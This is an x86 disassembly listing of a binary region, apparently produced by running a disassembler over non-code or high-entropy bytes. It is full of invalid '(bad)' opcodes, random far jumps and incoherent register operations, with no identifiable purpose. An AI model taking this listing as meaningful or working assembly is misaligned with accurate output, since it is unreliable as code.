  409ba3:	idiv   BYTE PTR [edx-0x6406c9c4]
  409ba9:	bound  ecx,QWORD PTR [ebp-0x2a47f9d7]
  409baf:	adc    eax,0xc30c77f6
  409bb4:	call   FWORD PTR [edx+0x1f577ebd]
  409bba:	mov    dh,0x5f
  409bbc:	pop    esi
  409bbd:	and    bl,BYTE PTR [ebx+0x41b124d2]
  409bc3:	xor    DWORD PTR [esi+0x7897c5f5],ebp
  409bc9:	xor    al,0xc3
  409bcb:	fld    st(4)
  409bcd:	mov    ebx,0x7b06b52c
  409bd2:	js     0x409bc4
  409bd4:	test   BYTE PTR [eax+0x746a4096],cl
  409bda:	psllw  mm2,mm2
  409bdd:	loope  0x409c45
  409bdf:	inc    esp
  409be0:	sar    BYTE PTR [esi-0x27],0x15
  409be4:	push   0xe
  409be6:	mov    eax,ds:0x4ea6ca4c
  409beb:	sub    ah,dh
  409bed:	sbb    eax,0x656ac7b8
  409bf2:	mov    esp,0xc92f556b
  409bf7:	fcmove st,st(5)
  409bf9:	jnp    0x409bd9
  409bfb:	(bad)  
  409bfc:	fcom   QWORD PTR [edi+0x5e]
  409bff:	adc    edx,DWORD PTR [ebx+0x58]
  409c02:	dec    esp
  409c03:	add    BYTE PTR [ebx+0x55a3efd3],dl
  409c09:	dec    ecx
  409c0a:	(bad)  
  409c0b:	cmc    
  409c0c:	xor    BYTE PTR [edx+0x4c],0xe8
  409c10:	mov    ah,0x0
  409c12:	mov    al,ds:0xd7a715fd
  409c17:	ss xchg edi,eax
  409c19:	out    0xa1,eax
  409c1b:	pop    edx
  409c1c:	xchg   esp,eax
  409c1d:	ja     0x409c39
  409c1f:	adc    al,BYTE PTR [edx+0x4]
  409c22:	jno    0x409c13
  409c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c25:	jp     0x409c70
  409c27:	mov    bh,BYTE PTR [edi]
  409c29:	cmp    bl,BYTE PTR [edi]
  409c2b:	out    0x3a,al
  409c2d:	push   esi
  409c2e:	dec    ebx
  409c2f:	mov    ebx,0x8406fd59
  409c34:	cli    
  409c35:	push   ss
  409c36:	and    eax,0x98472c3a
  409c3b:	jecxz  0x409c9d
  409c3d:	aaa    
  409c3e:	frstor [ebx+0x7c2538b8]
  409c44:	dec    ecx
  409c45:	sbb    DWORD PTR [ebx],eax
  409c47:	push   ds
  409c48:	rol    DWORD PTR [ebx],1
  409c4a:	(bad)  
  409c4c:	(bad)  
  409c4d:	jle    0x409c35
  409c4f:	mov    esp,0xea4bf1ed
  409c54:	rcr    BYTE PTR [esi+ecx*2],0xe2
  409c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c59:	(bad)  
  409c5a:	cli    
  409c5b:	(bad)  
  409c5c:	int3   
  409c5d:	mov    WORD PTR [edx+0x46],gs
  409c60:	retf   
  409c61:	out    0xf5,al
  409c63:	fwait
  409c64:	out    0xc0,al
  409c66:	sub    ecx,DWORD PTR [esi]
  409c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c69:	fs dec edx
  409c6b:	push   edx
  409c6c:	jmp    0x409c80
  409c6e:	mov    al,0x28
  409c70:	(bad)  
  409c71:	popf   
  409c72:	jmp    0x862493e5
  409c77:	in     al,0xcb
  409c79:	daa    
  409c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c7b:	xchg   ebx,eax
  409c7c:	int3   
  409c7d:	push   ds
  409c7e:	xor    al,dh
  409c80:	and    ecx,0x59
  409c83:	adc    dh,BYTE PTR [ebx+0x3202dace]
  409c89:	inc    esp
  409c8a:	xchg   ecx,eax
  409c8b:	mov    ss,WORD PTR [edx+0x3c]
  409c8e:	lods   al,BYTE PTR ds:[esi]
  409c8f:	pop    ebp
  409c90:	fcom   QWORD PTR [edi-0x2f]
  409c93:	xchg   ecx,eax
  409c94:	mov    eax,ds:0xd8c3b51
  409c99:	stc    
  409c9a:	daa    
  409c9b:	fcomp  QWORD PTR [edx-0x2d]
  409c9e:	shr    BYTE PTR [ebx+0x7df625f6],1
  409ca4:	fist   WORD PTR [edi+0x34]
  409ca7:	xchg   ecx,eax
  409ca8:	test   al,0x93
  409caa:	sar    DWORD PTR [edi+edi*2],cl
  409cad:	inc    ebx
  409cae:	add    BYTE PTR [ebx],bh
  409cb0:	mov    ds:0x99fcd896,al
  409cb5:	and    ch,BYTE PTR [eax-0x331d16bf]
  409cbb:	sub    al,0xb2
  409cbd:	sub    al,0xcf
  409cbf:	dec    edi
  409cc0:	div    DWORD PTR [edi]
  409cc2:	cmp    dl,BYTE PTR [ebx+ebp*2-0x438dd1e6]
  409cc9:	test   eax,0x80515857
  409cce:	push   esi
  409ccf:	sbb    al,0x88
  409cd1:	dec    esp
  409cd2:	fdiv   st,st(3)
  409cd4:	jmp    0xcf6a:0xd6d5147f
  409cdb:	mov    WORD PTR [ecx-0x53fddbec],ss
  409ce1:	cmp    BYTE PTR [edx-0x64],dh
  409ce4:	adc    al,0xd1
  409ce6:	aam    0x7c
  409ce8:	lods   al,BYTE PTR ds:[esi]
  409ce9:	in     eax,0x8f
  409ceb:	bound  eax,QWORD PTR [edx*2-0x160f7da2]
  409cf2:	mov    WORD PTR [ecx-0x71],ss
  409cf5:	add    dl,BYTE PTR [edx-0x3e0c4e37]
  409cfb:	jno    0x409cc5
  409cfd:	jmp    0x3093b0bc
  409d02:	adc    al,0xa1
  409d04:	(bad)  
  409d05:	sub    BYTE PTR [ebx-0x773bd32e],al
  409d0b:	mov    edx,0x8363cacf
  409d10:	icebp  
  409d11:	gs adc al,0x6a
  409d14:	aad    0x24
  409d16:	add    BYTE PTR [eax+0x7c5b69c6],0x1a
  409d1d:	stos   BYTE PTR es:[edi],al
  409d1e:	les    edx,FWORD PTR [edx-0x600bad60]
  409d24:	icebp  
  409d25:	sub    ebp,DWORD PTR [ecx-0x70]
  409d28:	inc    edx
  409d29:	or     bl,BYTE PTR [ebx-0x5db6f789]
  409d2f:	jp     0x409d5d
  409d31:	ret    
  409d32:	pop    eax
  409d33:	fdiv   DWORD PTR [edx-0x1d48bc35]
  409d39:	dec    ebx
  409d3a:	retf   
  409d3b:	xor    al,bh
  409d3d:	or     edx,edi
  409d3f:	aas    
  409d40:	adc    ch,cl
  409d42:	shl    esp,cl
  409d44:	push   cs
  409d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d46:	add    al,0xe6
  409d48:	repnz arpl WORD PTR ds:0xb3a34aaf,di
  409d4f:	cs mov eax,0x91531514
  409d55:	xor    DWORD PTR [edi-0x3e],edx
  409d58:	dec    BYTE PTR [edi+0x69cfc7d0]
  409d5e:	popa   
  409d5f:	sbb    BYTE PTR [edx-0x9d6322c],bl
  409d65:	inc    ch
  409d67:	popa   
  409d68:	jmp    0xbe1dd5be
  409d6d:	lods   eax,DWORD PTR ds:[esi]
  409d6e:	(bad)  
  409d6f:	adc    ch,BYTE PTR [esi+0x751a86c8]
  409d75:	or     ebx,DWORD PTR ss:[edi-0x79]
  409d79:	call   DWORD PTR [ebp+ecx*4+0x42]
  409d7d:	jae    0x409d22
  409d7f:	mov    eax,0x3fae2c4c
  409d84:	loope  0x409d6f
  409d86:	int    0x76
  409d88:	jecxz  0x409d19
  409d8a:	add    al,0xf0
  409d8c:	into   
  409d8d:	aam    0x4d
  409d8f:	and    al,0x3a
  409d91:	in     al,dx
  409d92:	les    edi,FWORD PTR [esi]
  409d94:	pop    ds
  409d95:	sub    BYTE PTR [ecx-0x21ac55f5],dh
  409d9b:	jmp    0x6b0a5b4f
  409da0:	(bad)  [ebx+0x1d]
  409da3:	inc    esp
  409da4:	inc    esp
  409da5:	in     eax,dx
  409da6:	jmp    0x173222f9
  409dab:	test   BYTE PTR [ecx],0x2
  409dae:	push   ebp
  409daf:	and    ch,dl
  409db1:	mov    ecx,0x654b22e8
  409db6:	fwait
  409db7:	pop    edx
  409db8:	leave  
  409db9:	fcomi  st,st(6)
  409dbb:	or     bl,BYTE PTR [edi-0x6c9186c3]
  409dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc2:	push   esi
  409dc3:	lock outs dx,DWORD PTR ds:[esi]
  409dc5:	jnp    0x409dfe
  409dc7:	adc    dh,bh
  409dc9:	add    eax,0x77ce82b
  409dce:	out    dx,eax
  409dcf:	dec    ecx
  409dd0:	jne    0x409d65
  409dd2:	mov    ebx,cs
  409dd4:	xchg   DWORD PTR [edx],edx
  409dd6:	push   ss
  409dd7:	push   esp
  409dd8:	leave  
  409dd9:	int    0x5c
  409ddb:	pop    DWORD PTR [ebx+0x7f]
  409dde:	add    edi,DWORD PTR [esp+ebp*4+0xd]
  409de2:	push   ebp
  409de3:	jae    0x409da6
  409de5:	sub    ebx,edx
  409de7:	and    DWORD PTR [ebx+eiz*4-0x3b],ecx
  409deb:	(bad)  
  409dec:	clc    
  409ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dee:	sub    BYTE PTR [edi+0x58a98e3],ah
  409df4:	xor    al,0x91
  409df6:	cld    
  409df7:	sbb    al,0x80
  409df9:	call   0x3d39dd94
  409dfe:	and    cl,BYTE PTR [ebp+0x53fc98e9]
  409e04:	loop   0x409e18
  409e06:	mov    ebp,?
  409e08:	ja     0x409dbc
  409e0a:	stc    
  409e0b:	jne    0x409e3c
  409e0d:	push   es
  409e0e:	imul   edx,DWORD PTR [ebx],0x32701a65
  409e14:	cmp    edx,ecx
  409e16:	test   eax,0x131a8a25
  409e1b:	lock repz sub cl,BYTE PTR [ebx]
  409e1f:	and    al,0xfb
  409e21:	cmp    DWORD PTR [ebx+0x6ff9bd67],esi
  409e27:	adc    ebx,DWORD PTR [edi+0x54b246ae]
  409e2d:	fadd   DWORD PTR [ecx]
  409e2f:	adc    eax,0x681e9bd
  409e34:	xchg   ecx,eax
  409e35:	mov    ch,0x63
  409e37:	dec    eax
  409e38:	cs (bad) 
  409e3a:	fcmovnu st,st(3)
  409e3c:	sahf   
  409e3d:	sub    al,0x4c
  409e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e41:	(bad)  
  409e42:	lahf   
  409e43:	call   0x658c:0x521954f2
  409e4a:	lea    edi,[eax]
  409e4c:	adc    eax,0x5f5c5c3c
  409e51:	inc    ebx
  409e52:	inc    esi
  409e53:	cs clc 
  409e55:	mov    eax,ds:0xf0174bf7
  409e5a:	clc    
  409e5b:	mov    ebp,0x440e73e6
  409e60:	push   edi
  409e61:	aad    0x2b
  409e63:	dec    esi
  409e64:	dec    eax
  409e65:	push   ss
  409e66:	or     bh,bh
  409e68:	loopne 0x409e5a
  409e6a:	scas   eax,DWORD PTR es:[edi]
  409e6b:	adc    eax,0xf056af08
  409e70:	in     eax,dx
  409e71:	lahf   
  409e72:	(bad)  
  409e73:	mov    al,0x93
  409e75:	pop    ebp
  409e76:	xor    al,0x35
  409e78:	push   ds
  409e79:	pop    esp
  409e7a:	mov    ecx,0x43ae0ba2
  409e7f:	inc    esi
  409e80:	js     0x409e3f
  409e82:	pop    esp
  409e83:	ins    BYTE PTR es:[edi],dx
  409e84:	(bad)  
  409e85:	sub    BYTE PTR [edx],0xdd
  409e88:	fistp  QWORD PTR [edi-0x5aeb774b]
  409e8e:	sub    ebx,DWORD PTR [esi+0x1e]
  409e91:	jmp    0xb4e8f042
  409e96:	or     ebp,esi
  409e98:	push   eax
  409e99:	clc    
  409e9a:	out    dx,eax
  409e9b:	mov    ebx,0x236e42ca
  409ea0:	and    ebx,edx
  409ea2:	adc    al,0xf7
  409ea4:	hlt    
  409ea5:	arpl   WORD PTR [edi+eiz*2],dx
  409ea8:	(bad)  
  409ea9:	mov    BYTE PTR [ebp-0x31b44970],bl
  409eaf:	(bad)  
  409eb0:	mov    al,ds:0x5d6fcc1
  409eb5:	in     eax,dx
  409eb6:	(bad)  
  409eb7:	jae    0x409ee1
  409eb9:	pop    esi
  409eba:	sub    BYTE PTR [ecx],ch
  409ebc:	mov    al,ds:0x52d6401f
  409ec1:	das    
  409ec2:	mov    esi,DWORD PTR [ebp+0x1ea0a605]
  409ec8:	stos   BYTE PTR es:[edi],al
  409ec9:	or     bh,ah
  409ecb:	mov    al,0x99
  409ecd:	js     0x409ec1
  409ecf:	xchg   edx,eax
  409ed0:	mov    cs,WORD PTR [esi-0x5b08fc83]
  409ed6:	jmp    0x409e91
  409ed8:	fist   WORD PTR [edx]
  409eda:	push   cs
  409edb:	test   eax,0x9cdc83e3
  409ee0:	gs xchg edx,eax
  409ee2:	iret   
  409ee3:	hlt    
  409ee4:	sbb    DWORD PTR [esi-0x70a3e702],0xffffffe8
  409eeb:	sub    esi,eax
  409eed:	mov    DWORD PTR [ebx-0x55fecf49],edi
  409ef3:	fsubr  st,st(1)
  409ef5:	mov    ds:0xe694adce,al
  409efa:	ret    0x7c7
  409efd:	aaa    
  409efe:	push   esi
  409eff:	rcr    BYTE PTR [ebp+ecx*4+0x258cbf04],0x17
  409f07:	test   BYTE PTR [ecx+0x65],0x79
  409f0b:	data16 jp 0x409edf
  409f0e:	pop    esi
  409f0f:	in     eax,dx
  409f10:	inc    edx
  409f11:	in     eax,0x66
  409f13:	dec    ebx
  409f14:	jnp    0x409f86
  409f16:	pop    es
  409f17:	aaa    
  409f18:	popa   
  409f19:	mov    al,ds:0x9efd3432
  409f1e:	mov    edx,DWORD PTR [edx+0x1b]
  409f21:	xchg   edi,eax
  409f22:	imul   BYTE PTR [eax+0x40]
  409f25:	and    BYTE PTR [esi+ecx*2-0x2c20ea4a],bl
  409f2c:	mov    al,ds:0x19238e54
  409f31:	enter  0xe58b,0xb0
  409f35:	xor    eax,0x64ef6830
  409f3a:	mov    WORD PTR [edi],cs
  409f3c:	jmp    0x409f7e
  409f3e:	pushf  
  409f3f:	aaa    
  409f40:	les    edx,FWORD PTR [edx]
  409f42:	adc    BYTE PTR [eax],ah
  409f44:	jmp    0x976b:0xbe165bc4
  409f4b:	adc    ecx,esp
  409f4d:	xor    edx,DWORD PTR ds:0xd4e8adda
  409f53:	dec    dl
  409f55:	repnz mov bh,0xfa
  409f58:	mov    eax,0x4180504b
  409f5d:	mov    ah,0x9f
  409f5f:	pop    eax
  409f60:	cwde   
  409f61:	call   0x2bdf398e
  409f66:	xor    esp,edx
  409f68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f69:	inc    esp
  409f6a:	das    
  409f6b:	jno    0x409f81
  409f6d:	(bad)  
  409f6e:	in     al,dx
  409f6f:	cdq    
  409f70:	dec    ecx
  409f71:	lock pushf 
  409f73:	fcom   st(7)
  409f75:	xchg   edx,eax
  409f76:	mov    ds:0x8f1422e8,al
  409f7b:	cdq    
  409f7c:	cmc    
  409f7d:	(bad)  
  409f7f:	pop    ss
  409f80:	mov    BYTE PTR [ebx-0x2b],bl
  409f83:	push   ebx
  409f84:	jge    0x409f9d
  409f86:	dec    esp
  409f87:	les    ebx,FWORD PTR [ebx-0x19a1cb84]
  409f8d:	jmp    0xca5e8dfc
  409f92:	test   BYTE PTR [edi],0x37
  409f95:	cdq    
  409f96:	out    dx,al
  409f97:	fs mov dh,0x47
  409f9a:	add    eax,edi
  409f9c:	add    esp,esp
  409f9e:	clc    
  409f9f:	cs mov ebp,0xa837d4c9
  409fa5:	std    
  409fa6:	mov    fs,WORD PTR [eax]
  409fa8:	(bad)  [esi]
  409faa:	scas   eax,DWORD PTR es:[edi]
  409fab:	push   0xffffffb2
  409fad:	sbb    DWORD PTR [edi-0xc0997b6],edi
  409fb3:	fcom   DWORD PTR [eax]
  409fb5:	fsub   DWORD PTR [eax-0x73b63a79]
  409fbb:	dec    esp
  409fbc:	and    al,0x50
  409fbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fbf:	sahf   
  409fc0:	xor    eax,0x896e3432
  409fc5:	fcom   st(7)
  409fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fc8:	dec    esi
  409fc9:	rcl    al,1
  409fcb:	jae    0x409f9b
  409fcd:	sbb    DWORD PTR [eax+0x7c6654e1],ecx
  409fd3:	sbb    eax,0x360e6aaf
  409fd8:	jmp    0x5f386b6a
  409fdd:	mov    ebx,0x4d03478c
  409fe2:	mov    ebp,DWORD PTR [edi+0xcf1481a]
  409fe8:	repnz cmp DWORD PTR [esi+0x2d],ebp
  409fec:	mov    ebp,0x64a702a6
  409ff1:	ror    dh,cl
  409ff3:	test   al,0x72
  409ff5:	jmp    0x33a9:0xfa2c257c
  409ffc:	add    eax,0x5e785b60
  40a001:	inc    ecx
  40a002:	cmp    al,0x4
  40a004:	or     BYTE PTR es:[esi-0x6cbbe5fd],ah
  40a00b:	fsubr  st(4),st
  40a00d:	subps  xmm0,xmm7
  40a010:	inc    ecx
  40a011:	and    BYTE PTR [ebp+0x64ea2c10],dh
  40a017:	pop    ecx
  40a018:	mov    ?,WORD PTR [ebx]
  40a01a:	mul    DWORD PTR [ebx]
  40a01c:	inc    ebp
  40a01d:	pop    ds
  40a01e:	sti    
  40a01f:	sbb    esi,edx
  40a021:	into   
  40a022:	xchg   esi,eax
  40a023:	repz or DWORD PTR [eax+0x28647fdf],ecx
  40a02a:	rcr    BYTE PTR [eax+0x3ceeb163],1
  40a030:	or     al,0xba
  40a032:	repz arpl WORD PTR [ebx+0x53],si
  40a036:	test   DWORD PTR [ecx+0x78],ebp
  40a039:	mov    edi,0xb5a90d12
  40a03e:	add    ebx,DWORD PTR [edi-0x4205b869]
  40a044:	fcmove st,st(5)
  40a046:	sub    eax,esp
  40a048:	jp     0x409fde
  40a04a:	fidivr WORD PTR [edi-0x70]
  40a04d:	push   ss
  40a04e:	push   es
  40a04f:	scas   al,BYTE PTR es:[edi]
  40a050:	sub    esp,DWORD PTR [edi+0x70]
  40a053:	and    ebx,esp
  40a055:	jno    0x409fed
  40a057:	data16 aaa 
  40a059:	pop    edx
  40a05a:	into   
  40a05b:	xchg   edx,eax
  40a05c:	(bad)  
  40a05e:	mov    esp,0x10495f13
  40a063:	ret    
  40a064:	mov    eax,ds:0x30f5cb4
  40a069:	xor    ebx,DWORD PTR [ebx]
  40a06b:	enter  0xdbd3,0x79
  40a06f:	cld    
  40a070:	call   0x1aff:0x6dabfa86
  40a077:	(bad)  
  40a078:	out    0x99,ax
  40a07b:	xchg   edi,eax
  40a07c:	sbb    dh,BYTE PTR [ebx]
  40a07e:	adc    ch,BYTE PTR [esi+eiz*1+0x4c]
  40a082:	and    cl,ah
  40a084:	test   eax,0x315e6bee
  40a089:	sbb    al,BYTE PTR [eax]
  40a08b:	jb     0x40a109
  40a08d:	retf   0xd021
  40a090:	xchg   esi,eax
  40a091:	sub    esp,DWORD PTR [ecx-0x56c3f569]
  40a097:	imul   eax,DWORD PTR [eax+edi*2-0x316d397],0x51
  40a09f:	jb     0x40a086
  40a0a1:	fcmove st,st(0)
  40a0a3:	mov    ds:0xffea36a8,al
  40a0a8:	ret    0xb927
  40a0ab:	dec    esi
  40a0ac:	retf   
  40a0ad:	in     al,0xc7
  40a0af:	lea    esi,[ecx]
  40a0b1:	jnp    0x40a132
  40a0b3:	push   eax
  40a0b4:	and    bh,bl
  40a0b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0b7:	mov    esi,0xc0fd9d8
  40a0bc:	pushf  
  40a0bd:	jecxz  0x40a130
  40a0bf:	cmp    eax,0x7b94b197
  40a0c4:	rol    ch,cl
  40a0c6:	gs pop ds
  40a0c8:	stc    
  40a0c9:	mul    ebp
  40a0cb:	mov    ch,0x81
  40a0cd:	xchg   esp,eax
  40a0ce:	aad    0xbe
  40a0d0:	js     0x40a102
  40a0d2:	jno    0x40a14f
  40a0d4:	cmp    al,0xce
  40a0d6:	adc    ah,BYTE PTR [edx-0x76]
  40a0d9:	jno    0x40a10e
  40a0db:	fist   DWORD PTR [ecx-0x7b46d2fd]
  40a0e1:	cmp    BYTE PTR [esi-0x172b5890],bh
  40a0e7:	adc    BYTE PTR [ebx+ebx*2-0x7d],cl
  40a0eb:	inc    ebp
  40a0ec:	mov    eax,ds:0x61896d18
  40a0f1:	and    BYTE PTR [edi+0x1d],al
  40a0f4:	rcr    BYTE PTR [ecx],0xcf
  40a0f7:	mov    dh,0xac
  40a0f9:	cmp    al,BYTE PTR [edi]
  40a0fb:	add    eax,0xb9f529bf
  40a100:	pop    ss
  40a101:	imul   esp,DWORD PTR [edx],0xda3e22a7
  40a107:	push   es
  40a108:	cmp    cl,BYTE PTR cs:[ebx+eax*4]
  40a10c:	div    ah
  40a10e:	nop
  40a10f:	pop    edx
  40a110:	pop    edi
  40a111:	xchg   BYTE PTR [ebp-0x28a33797],ch
  40a117:	les    ebx,FWORD PTR [ecx-0x51]
  40a11a:	push   cs
  40a11b:	gs pop eax
  40a11d:	dec    edx
  40a11e:	xor    eax,DWORD PTR [ecx+0x7]
  40a121:	dec    DWORD PTR [ebx+0xb]
  40a124:	mov    al,0xab
  40a126:	repnz inc ecx
  40a128:	ds ds or eax,0x597d5143
  40a12f:	test   al,0x92
  40a131:	fild   WORD PTR [edx]
  40a133:	nop
  40a134:	pop    ebx
  40a135:	int3   
  40a136:	imul   edx,edi,0xcd0a93da
  40a13c:	mov    fs,WORD PTR [edi]
  40a13e:	int    0x6
  40a140:	imul   ecx,DWORD PTR [ebx-0x13],0xa89befd0
  40a147:	int3   
  40a148:	popa   
  40a149:	pushf  
  40a14a:	jmp    0x40a114
  40a14c:	mov    cl,0x8d
  40a14e:	stos   DWORD PTR es:[edi],eax
  40a14f:	(bad)  
  40a150:	dec    esi
  40a151:	push   edx
  40a152:	outs   dx,BYTE PTR ds:[esi]
  40a153:	pop    edx
  40a154:	shr    BYTE PTR [edi-0x5b],0x19
  40a158:	sahf   
  40a159:	inc    ecx
  40a15a:	mov    eax,ds:0x68e4484d
  40a15f:	xchg   ecx,eax
  40a160:	loop   0x40a19f
  40a162:	adc    DWORD PTR [ebp+0x14],ebx
  40a165:	push   edi
  40a166:	push   edi
  40a167:	loope  0x40a1b9
  40a169:	dec    esi
  40a16a:	test   DWORD PTR [edx-0x38c44b63],esp
  40a170:	loopne 0x40a174
  40a172:	push   ss
  40a173:	xchg   esp,eax
  40a174:	adc    eax,DWORD PTR [ebx+0x68]
  40a177:	pop    ecx
  40a178:	push   ecx
  40a179:	inc    esp
  40a17a:	out    0x9a,eax
  40a17c:	mov    esi,0x8c3b3a3f
  40a181:	push   es
  40a182:	inc    eax
  40a183:	scas   eax,DWORD PTR es:[edi]
  40a184:	fbstp  TBYTE PTR [ecx+0x47]
  40a187:	xchg   ebx,eax
  40a188:	add    dh,BYTE PTR [edx]
  40a18a:	sub    BYTE PTR [edi-0x4611c751],dh
  40a190:	jle    0x40a1d3
  40a192:	(bad)  
  40a194:	lods   al,BYTE PTR ds:[esi]
  40a195:	iret   
  40a196:	int    0x88
  40a198:	fild   DWORD PTR [ebx]
  40a19a:	iret   
  40a19b:	dec    esp
  40a19c:	jl     0x40a1df
  40a19e:	jge    0x40a198
  40a1a0:	mov    eax,ds:0xf865125c
  40a1a5:	adc    eax,0x29f9459c
  40a1aa:	mov    esi,0x40aea2c4
  40a1af:	imul   ecx,DWORD PTR [ebx+0x19],0xe436efb7
  40a1b6:	cwde   
  40a1b7:	jb     0x40a215
  40a1b9:	inc    edi
  40a1ba:	jmp    0x40a22c
  40a1bc:	arpl   WORD PTR [esp+edi*8],dx
  40a1bf:	dec    eax
  40a1c0:	xor    esp,ebx
  40a1c2:	addr16 push 0x67
  40a1c5:	stos   DWORD PTR es:[edi],eax
  40a1c6:	ret    0x49b1
  40a1c9:	cld    
  40a1ca:	sub    ecx,edi
  40a1cc:	add    dh,BYTE PTR [ecx]
  40a1ce:	bound  ecx,QWORD PTR [edx+0x53f341bd]
  40a1d4:	add    BYTE PTR ds:0xe763d4d3,cl
  40a1da:	in     eax,dx
  40a1db:	jo     0x40a189
  40a1dd:	fdivp  st(7),st
  40a1df:	jl     0x40a193
  40a1e1:	ss popa 
  40a1e3:	call   0x569fc30c
  40a1e8:	inc    esi
  40a1e9:	imul   ecx,DWORD PTR [esi+0x40f85284],0x947352f9
  40a1f3:	cmp    al,0xe2
  40a1f5:	popf   
  40a1f6:	xor    edx,DWORD PTR ds:0x398e6d1
  40a1fc:	outs   dx,BYTE PTR ds:[esi]
  40a1fd:	cld    
  40a1fe:	bound  edi,QWORD PTR [edx+0x10]
  40a201:	and    al,0xb8
  40a203:	push   0x110481ca
  40a208:	imul   esp,DWORD PTR [ecx],0x62ce8193
  40a20e:	pushw  0xfff2
  40a211:	mov    eax,0x7256f9d5
  40a216:	popf   
  40a217:	stos   BYTE PTR es:[edi],al
  40a218:	push   edi
  40a219:	cmp    DWORD PTR [edi+0x51970095],0x25e96459
  40a223:	jl     0x40a1eb
  40a225:	ja     0x40a231
  40a227:	scas   eax,DWORD PTR es:[edi]
  40a228:	cmp    DWORD PTR [esi+0x27],esp
  40a22b:	retf   0x9ef
  40a22e:	mul    BYTE PTR [eax]
  40a230:	leave  
  40a231:	lods   eax,DWORD PTR ds:[esi]
  40a232:	fnstenv [edx]
  40a234:	adc    BYTE PTR [ecx+0x57b42f98],ch
  40a23a:	and    al,0xda
  40a23c:	push   0xffffffec
  40a23e:	xchg   BYTE PTR [ebp-0x1eeaccf9],cl
  40a244:	ss xor DWORD PTR cs:[ebp-0x50ca0703],0xaa538e5a
  40a250:	outs   dx,BYTE PTR ds:[esi]
  40a251:	icebp  
  40a252:	adc    al,0x2f
  40a254:	xchg   esi,eax
  40a255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a256:	mov    edx,0x5bfbd0b7
  40a25b:	inc    esi
  40a25c:	ret    
  40a25d:	xlat   BYTE PTR ds:[ebx]
  40a25e:	retf   
  40a25f:	fild   QWORD PTR [ecx]
  40a261:	in     eax,0x30
  40a263:	pusha  
  40a264:	sub    eax,0xed9852f9
  40a269:	mov    esi,0xda60eee6
  40a26e:	inc    esi
  40a26f:	cmp    DWORD PTR [esi],0xffffffb4
  40a272:	mov    eax,ds:0x92bca360
  40a277:	in     al,0x32
  40a279:	(bad)  
  40a27a:	sbb    edi,DWORD PTR [esi-0x7735c642]
  40a280:	scas   al,BYTE PTR es:[edi]
  40a281:	imul   BYTE PTR [edx-0x757a8e5c]
  40a287:	mov    eax,ds:0x8e2cc867
  40a28c:	jmp    0x40a22e
  40a28e:	and    eax,0x7832c0be
  40a293:	jno    0x40a2a6
  40a295:	repz sti 
  40a297:	lods   al,BYTE PTR ds:[esi]
  40a298:	pop    ds
  40a299:	std    
  40a29a:	loop   0x40a2c5
  40a29c:	cmp    ah,BYTE PTR [ebx+0x6e]
  40a29f:	push   esp
  40a2a0:	aas    
  40a2a1:	dec    esi
  40a2a2:	pop    esp
  40a2a3:	mov    ebx,0x839566e3
  40a2a8:	mov    edx,0xadc75a9c
  40a2ad:	mov    esp,0x43146ef
  40a2b2:	adc    DWORD PTR [edi-0x32],0xffffffad
  40a2b6:	in     al,dx
  40a2b7:	bound  ecx,QWORD PTR [ebx+0x49]
  40a2ba:	(bad)  
  40a2bb:	(bad)  
  40a2bc:	scas   eax,DWORD PTR es:[edi]
  40a2bd:	call   0x1483:0xd84cd1b
  40a2c4:	mov    ecx,0xdf3c57b9
  40a2c9:	arpl   WORD PTR [edi+0x6a],di
  40a2cc:	imul   esi,DWORD PTR [eax+0x2b],0xffffffee
  40a2d0:	dec    ecx
  40a2d1:	sahf   
  40a2d2:	add    ecx,DWORD PTR [eax]
  40a2d4:	xchg   ebp,eax
  40a2d5:	sub    esp,edi
  40a2d7:	cmp    al,0x6f
  40a2d9:	imul   edi,DWORD PTR [ebp-0x33],0x3c
  40a2dd:	retf   
  40a2de:	mov    esp,0xe39ed802
  40a2e3:	xlat   BYTE PTR ds:[ebx]
  40a2e4:	nop
  40a2e5:	xchg   edi,eax
  40a2e6:	mov    eax,ds:0xfd51d159
  40a2eb:	and    edx,edx
  40a2ed:	lahf   
  40a2ee:	out    0xa4,al
  40a2f0:	sbb    esp,DWORD PTR [edi-0x2cd3d405]
  40a2f6:	aad    0x9d
  40a2f8:	add    BYTE PTR [eax+eax*8+0x6d],dh
  40a2fc:	fwait
  40a2fd:	adc    ebx,DWORD PTR [edi+0x46cb8c42]
  40a303:	mov    eax,0x37dde8e3
  40a308:	enter  0x9076,0xce
  40a30c:	je     0x40a351
  40a30e:	cmp    BYTE PTR [edi],0xa7
  40a311:	lods   eax,DWORD PTR ds:[esi]
  40a312:	popa   
  40a313:	cdq    
  40a314:	or     BYTE PTR [eax+0x64],0x6d
  40a318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a319:	or     DWORD PTR [esi-0x53],ebp
  40a31c:	xchg   edi,eax
  40a31d:	int    0xdc
  40a31f:	mov    ebp,0x27017c4b
  40a324:	fsub   DWORD PTR [ecx-0x53]
  40a327:	into   
  40a328:	scas   eax,DWORD PTR es:[edi]
  40a329:	loop   0x40a381
  40a32b:	popa   
  40a32c:	call   0xde30:0xd83f1e7a
  40a333:	xchg   ebp,eax
  40a334:	test   eax,0x671a76e2
  40a339:	lods   al,BYTE PTR ds:[esi]
  40a33a:	sub    eax,0xf10df4a3
  40a33f:	mov    ecx,0xef8d8229
  40a344:	(bad)  
  40a345:	fsub   DWORD PTR [esi-0x3ab7269]
  40a34b:	hlt    
  40a34c:	aaa    
  40a34d:	and    BYTE PTR [edi],0xb0
  40a350:	xchg   ebx,eax
  40a351:	pop    es
  40a352:	push   cs
  40a353:	pop    es
  40a354:	or     dh,BYTE PTR [edx]
  40a356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a357:	es inc bh
  40a35a:	cmp    ch,BYTE PTR [edx+ebp*4+0x4a]
